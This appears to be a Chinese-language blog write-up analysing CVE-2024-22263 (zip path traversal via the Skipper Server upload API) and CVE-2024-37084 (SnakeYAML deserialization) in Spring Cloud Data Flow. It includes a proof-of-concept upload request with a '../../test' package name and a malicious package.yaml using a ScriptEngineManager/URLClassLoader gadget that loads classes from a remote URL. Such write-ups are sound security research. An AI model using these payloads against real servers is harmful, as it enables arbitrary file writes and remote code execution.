# CVE-2024-22263&amp;CVE-2024-37084漏洞分析

  
  
&lt;!--more--&gt;  
## 0x00 环境搭建  
源码  
[https://github.com/spring-cloud/spring-cloud-dataflow/tree/v2.11.2](https://github.com/spring-cloud/spring-cloud-dataflow/tree/v2.11.2)  
修改`src/docker-compose`目录下的`docker.compose-yml`文件，添加调试端口  
```yaml  
ports:  
  - &#34;7577:7577&#34;  
  - &#34;6006:6006&#34;  
  - ${APPS_PORT_RANGE:-20000-20195:20000-20195}  
  
- JAVA_TOOL_OPTIONS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:6006  
```  
修改完后`docker compose up -d`启动  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201331922.png)
## 0x01 漏洞分析  
### CVE-2024-22263  
2.10.0&lt;=version&lt;=2.11.2  
`Skipper Server`在接收上传请求时对`zip`文件中的路径校验不严，具有`Skipper Server API`访问权限的攻击者可以通过上传请求将任意文件写入文件系统中的任意位置，从而获得服务器权限。  
直接定位到漏洞点  
`org.springframework.cloud.skipper.server.controller.PackageController`，访问`/api/package/upload`就可以调用到该方法  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201333443.png)
跟进到`this.packageService.upload()`，调用`validateUploadRequest()`对请求参数进行验证，主要验证验证如下  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201335405.png)
构造`payload`  
```python  
import zipfile    
import os    
    
# 创建 test.txtwith open(&#34;test.txt&#34;, &#34;w&#34;) as f:    
    f.write(&#34;Hello, this is a test file!&#34;)    
    
# 创建 test.zip 并添加 test.txtwith zipfile.ZipFile(&#34;test.zip&#34;, &#34;w&#34;, zipfile.ZIP_DEFLATED) as zipf:    
    zipf.write(&#34;test.txt&#34;)    
    
# 读取 ZIP 文件并转换为字节数组    
with open(&#34;test.zip&#34;, &#34;rb&#34;) as f:    
    byte_array = list(f.read())    
    
# 输出部分字节数组数据（避免输出过长）    
print(byte_array)  # 仅显示前100个字节  
```  
`http`  
````http  
{&#34;repoName&#34;:&#34;local&#34;,&#34;name&#34;:&#34;../../test&#34;,&#34;version&#34;:&#34;1.1.1&#34;,&#34;extension&#34;:&#34;zip&#34;,&#34;packageFileAsBytes&#34;:[80, 75, 3, 4, 20, 0, 0, 0, 8, 0, 239, 108, 84, 90, 219, 134, 15, 161, 27, 0, 0, 0, 27, 0, 0, 0, 8, 0, 0, 0, 116, 101, 115, 116, 46, 116, 120, 116, 243, 72, 205, 201, 201, 215, 81, 40, 201, 200, 44, 86, 0, 162, 68, 133, 146, 212, 226, 18, 133, 180, 204, 156, 84, 69, 0, 80, 75, 1, 2, 20, 3, 20, 0, 0, 0, 8, 0, 239, 108, 84, 90, 219, 134, 15, 161, 27, 0, 0, 0, 27, 0, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 164, 129, 0, 0, 0, 0, 116, 101, 115, 116, 46, 116, 120, 116, 80, 75, 5, 6, 0, 0, 0, 0, 1, 0, 1, 0, 54, 0, 0, 0, 65, 0, 0, 0, 0, 0]}  
````  
验证完参数后会回到`this.packageService.upload()`，调`getRepositoryToUpload()`，参数是`repoName`，在该方法下会验证`repoName`存储库是否存在，不存在抛出异常  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201342832.png)
通过`/api/repositories`接口就可以查看系统所有的`repository`，这里默认的`repository`是`local`，在`unpack()`处进行了解压操作，  
```sh  
1、创建一个临时路径packageDirPath，将packageDirPath和name拼接起来，没有对name进行过滤，得到packageDir后，调用mkdidr()创建文件夹  
2、创建一个packageFile，该文件路径表示压缩包的路径    
3、获取packageFileAsBytes参数的内容写入到packageFile压缩包里，接着将压缩包解压到`packageDir`目录下  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201352495.png)
构造`poc`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201351004.png)
成功写入  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201350559.png)
### CVE-2024-37084  
仍然是上面的接口，在下面代码存在`this.packageReader.read()`，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201448557.png)
如果存在`package.yaml`文件，则会进入`loadPackageMetadata()`函数  
进行`yaml.load`反序列化  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502201449520.png)
所以恶意的`package.yaml`文件如下  
```yaml  
apiVersion: 1.0.0  
origin: my origin  
repositoryId: 12345  
repositoryName: local  
kind: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&#34;dnslog&#34;]]]]  
name: test1  
version: 1.1.1  
```  
所以我们只需要构造`test-1.1.1`文件夹下放入`package.yaml`文件即可  
  
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/cve-2024-22263cve-2024-37084%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/  

